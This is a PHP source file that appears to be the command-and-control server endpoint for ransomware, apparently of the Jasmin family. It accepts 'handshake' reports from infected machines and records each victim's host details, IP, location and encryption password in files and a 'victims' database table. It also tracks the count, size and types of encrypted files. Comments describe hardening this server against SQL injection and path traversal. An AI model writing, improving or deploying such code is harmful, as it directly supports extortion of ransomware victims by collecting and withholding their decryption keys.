<?php
/**
 * Handshake — 接收受害者上报数据
 * 修复: PDO预处理防SQL注入, 文件名过滤防路径遍历, 密钥从.env读取
 */
require_once __DIR__ . '/database/db_conection.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['handshake'])) {
    http_response_code(403);
    echo 'You Are Not My Jasmin ! Get Lost.';
    exit;
}

// 从.env读取密钥
$secret = $_ENV['HANDSHAKE_SECRET'] ?? '';
if ($secret === '') {
    // 没配置密钥时不能回退到硬编码默认值（那等于公开的通行证）
    http_response_code(503);
    echo 'Handshake secret not configured.';
    exit;
}
if (!is_string($_POST['handshake']) || !hash_equals($secret, $_POST['handshake'])) {
    http_response_code(403);
    echo 'Invalid handshake.';
    exit;
}

// 过滤函数: 仅允许字母数字下划线连字符
function sanitize_filename(string $name): string {
    return preg_replace('/[^a-zA-Z0-9_\-]/', '_', $name);
}

$s = function($k,$d=''){ $v=$_POST[$k]??$d; return is_string($v)?$v:''; };
$machine_name   = $s('machine_name');
$computer_user  = $_POST['computer_user']  ?? '';
$os             = $_POST['os']             ?? '';
$date           = $_POST['date']           ?? '';
$time           = $_POST['time']           ?? '';
$systemid       = $_POST['systemid']       ?? '';
$location       = $_POST['location']       ?? '';
// IP 取服务端可见的真实来源：nginx 已设 X-Forwarded-For，
// 上报值可被被控端随意伪造，取证上不可信。
$_xff = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
$_rip = $_SERVER['HTTP_X_REAL_IP'] ?? '';
if ($_rip !== '')                $ip = $_rip;
elseif ($_xff !== '')            $ip = trim(explode(',', $_xff)[0]);
else                             $ip = $_SERVER['REMOTE_ADDR'] ?? '';
$password       = $_POST['password']       ?? '';
$encrypted_count = intval($_POST['encrypted_count'] ?? 0);
$encrypted_size  = intval($_POST['encrypted_size']  ?? 0);
$encrypted_types = $_POST['encrypted_types'] ?? '';
$encrypted_detail = $_POST['encrypted_detail'] ?? '';
$total_count     = intval($_POST['total_count'] ?? 0);
$total_size      = intval($_POST['total_size']  ?? 0);
$is_complete     = intval($_POST['is_complete'] ?? 1);  // 缺省视为已完成，兼容旧载荷
$is_complete     = $is_complete ? 1 : 0;

// 安全文件名
$safe_machine  = sanitize_filename($machine_name);
$safe_user     = sanitize_filename($computer_user);
$safe_systemid = sanitize_filename($systemid);
$newtime       = date("H-i-s", strtotime($time));

$folder = sanitize_filename($safe_machine . '_' . $safe_user);
$file   = sanitize_filename($newtime . '_' . $safe_systemid) . '.flora';

$base_dir = __DIR__ . '/passwords';
if (!is_dir($base_dir)) {
    mkdir($base_dir, 0750, true);
}
$target_dir = $base_dir . '/' . $folder;
if (!is_dir($target_dir)) {
    mkdir($target_dir, 0750, true);
}
file_put_contents($target_dir . '/' . $file, $password);

// PDO预处理 — upsert: 同一systemid更新统计数据，新主机插入
$stmt = $pdo->prepare(
    'INSERT INTO victims (machine_name, computer_user, os, date, time, ip, location, systemid, password, encrypted_count, encrypted_size, encrypted_types, encrypted_detail, total_count, total_size, is_complete)
     VALUES (:machine_name, :computer_user, :os, :date, :time, :ip, :location, :systemid, :password, :encrypted_count, :encrypted_size, :encrypted_types, :encrypted_detail, :total_count, :total_size, :is_complete)
     ON DUPLICATE KEY UPDATE
       machine_name=VALUES(machine_name), computer_user=VALUES(computer_user),
       os=VALUES(os), ip=VALUES(ip), location=VALUES(location),
       encrypted_count=IF(VALUES(encrypted_count)>0,VALUES(encrypted_count),encrypted_count),
       encrypted_size=IF(VALUES(encrypted_size)>0,VALUES(encrypted_size),encrypted_size),
       encrypted_types=IF(VALUES(encrypted_types)!="",VALUES(encrypted_types),encrypted_types),
       encrypted_detail=IF(VALUES(encrypted_detail)!="{}" AND VALUES(encrypted_detail)!="",VALUES(encrypted_detail),encrypted_detail),
       total_count=IF(VALUES(total_count)>0,VALUES(total_count),total_count),
       total_size=IF(VALUES(total_size)>0,VALUES(total_size),total_size),
       is_complete=VALUES(is_complete)'
);
$stmt->execute([
    ':machine_name'    => $machine_name,
    ':computer_user'   => $computer_user,
    ':os'              => $os,
    ':date'            => $date,
    ':time'            => $time,
    ':ip'              => $ip,
    ':location'        => $location,
    ':systemid'        => $systemid,
    ':password'        => $password,
    ':encrypted_count' => $encrypted_count,
    ':encrypted_size'  => $encrypted_size,
    ':encrypted_types' => $encrypted_types,
    ':encrypted_detail'=> $encrypted_detail,
    ':total_count'     => $total_count,
    ':total_size'      => $total_size,
    ':is_complete'     => $is_complete,
]);

echo 'handshake completed';
